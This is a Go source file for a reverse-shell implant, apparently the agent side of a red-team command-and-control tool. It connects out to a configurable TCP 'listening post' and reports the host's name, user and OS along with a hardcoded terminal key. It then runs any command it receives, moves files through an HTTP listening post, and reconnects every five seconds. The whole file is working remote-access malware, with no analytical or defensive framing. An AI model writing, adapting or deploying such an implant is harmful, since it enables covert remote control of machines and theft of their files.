package main

import (
   "bufio"
   "fmt"
   "net"
   "strings"
   "os"
   "os/user"
   "runtime"
   "time"
   "flag"

   "./commands"
)

var shellInfo, httpServer string

func runNextCommand(message string) []byte {
   if strings.HasPrefix(message, "cd") {
      pieces := strings.Split(message, "cd")
      bites := commands.ChangeDirectory(pieces[1])
      return bites
   } else if (strings.HasPrefix(message, "download")) {
      pieces := strings.Split(message, "download")
      go commands.Download(httpServer, pieces[1])
      return []byte("Download initiated\n")
   } else if (strings.HasPrefix(message, "upload")) {
      pieces := strings.Split(message, "upload")
      go commands.Upload(httpServer, pieces[1], shellInfo)
      return []byte("Upload initiated\n")
   } else {
      bites := commands.Execute(message)
      return bites
   }
}

func listen(conn net.Conn) {
   scanner := bufio.NewScanner(conn)
    for scanner.Scan() {
       message := scanner.Text()
       bites := runNextCommand(strings.TrimSpace(message))
       conn.Write(bites)
    }
}

func handshake(conn net.Conn) bool{
    conn.Write([]byte(terminal_key))
    conn.Write([]byte("\n"))
    conn.Write([]byte(shellInfo))
    conn.Write([]byte("\n"))
    return true
}

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   platform := runtime.GOOS
   shellInfo = fmt.Sprintf("%s$%s$%s", host, user.Username, platform)

   tcp := flag.String("tcp", "127.0.0.1:5678", "The IP of the TCP listening post")
   http := flag.String("http", "http://127.0.0.1:8888", "The IP of the HTTP listening post")
   flag.Parse()
   httpServer = *http

   for {
      conn, err := net.Dial("tcp", *tcp)
      if err != nil {
         fmt.Println(err)
      } else {
          handshake(conn)
          listen(conn)
      }
      time.Sleep(5 * time.Second)
   }
}

var key = "MY3DUY6IVC5LN956Q4KUEQEZ2TRQL9"
var terminal_key = "94699f9970213dd1d4054ca678f1278a"